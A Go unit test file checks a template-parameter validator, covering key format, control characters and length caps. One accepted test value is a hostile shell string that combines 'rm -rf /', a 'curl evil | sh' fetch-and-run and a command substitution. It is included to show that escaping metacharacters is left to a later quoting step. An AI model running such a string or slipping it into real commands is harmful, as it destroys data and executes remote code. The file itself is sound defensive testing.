package core_test

// templateparams_test.go — unit tests for core.ValidateTemplateParams (WG-045
// ingestion hygiene). Defense-in-depth: reject malformed keys, control chars
// (NUL/newline/tab), and over-length values before a value can reach substitution.

import (
	"errors"
	"strings"
	"testing"

	"github.com/gregberns/harmonik/internal/core"
)

func TestValidateTemplateParams_AcceptsValid(t *testing.T) {
	ok := []map[string]string{
		nil,
		{},
		{"SID": "PROJECT-123"},
		{"ISSUE_NUMBER": "172", "GITHUB_REPO": "foo/bar"},
		// Shell metacharacters in VALUES are deliberately allowed — neutralising
		// them is the shell-quoting close's job, not the validator's.
		{"CMD": "x; rm -rf / && curl evil | sh $(touch pwned)`echo`"},
		{"A1_B2": strings.Repeat("v", core.MaxTemplateParamValueBytes)}, // exactly at cap
	}
	for i, p := range ok {
		if err := core.ValidateTemplateParams(p); err != nil {
			t.Errorf("case %d: expected valid, got error: %v", i, err)
		}
	}
}

func TestValidateTemplateParams_RejectsControlChars(t *testing.T) {
	bad := map[string]string{
		"nul":     "x\x00y",
		"newline": "x\ny",
		"cr":      "x\ry",
		"tab":     "x\ty",
		"del":     "x\x7fy",
	}
	for label, v := range bad {
		err := core.ValidateTemplateParams(map[string]string{"SID": v})
		if err == nil {
			t.Errorf("%s: expected rejection for control char in value %q, got nil", label, v)
			continue
		}
		var ie *core.ErrInvalidTemplateParam
		if !errors.As(err, &ie) {
			t.Errorf("%s: expected *ErrInvalidTemplateParam, got %T", label, err)
		}
	}
}

func TestValidateTemplateParams_RejectsBadKey(t *testing.T) {
	bad := []string{"sid", "1ABC", "A-B", "A.B", "A B", "", "a_b"}
	for _, k := range bad {
		err := core.ValidateTemplateParams(map[string]string{k: "v"})
		if err == nil {
			t.Errorf("key %q: expected rejection, got nil", k)
			continue
		}
		var ie *core.ErrInvalidTemplateParam
		if !errors.As(err, &ie) {
			t.Errorf("key %q: expected *ErrInvalidTemplateParam, got %T", k, err)
		}
	}
}

func TestValidateTemplateParams_RejectsOverLengthValue(t *testing.T) {
	over := strings.Repeat("v", core.MaxTemplateParamValueBytes+1)
	err := core.ValidateTemplateParams(map[string]string{"BIG": over})
	if err == nil {
		t.Fatal("expected rejection for over-length value, got nil")
	}
	if !strings.Contains(err.Error(), "BIG") {
		t.Errorf("error %q does not name the offending key BIG", err.Error())
	}
}

func TestValidateTemplateParams_RejectsOverLengthKey(t *testing.T) {
	longKey := strings.Repeat("K", core.MaxTemplateParamKeyBytes+1)
	err := core.ValidateTemplateParams(map[string]string{longKey: "v"})
	if err == nil {
		t.Fatal("expected rejection for over-length key, got nil")
	}
}
